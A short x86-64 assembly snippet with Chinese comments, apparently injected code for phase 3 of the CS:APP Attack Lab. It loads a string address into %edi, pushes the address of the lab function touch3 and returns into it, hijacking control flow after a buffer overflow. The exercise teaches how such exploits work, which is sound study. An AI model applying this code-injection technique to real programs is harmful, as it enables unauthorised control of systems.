mov $0x5561dca8, %edi	# 修改edi的值,edi保存字符串的地址
pushq $0x4018fa			# 将touch3函数的首地址压栈
retq					# 从栈顶取出地址,返回
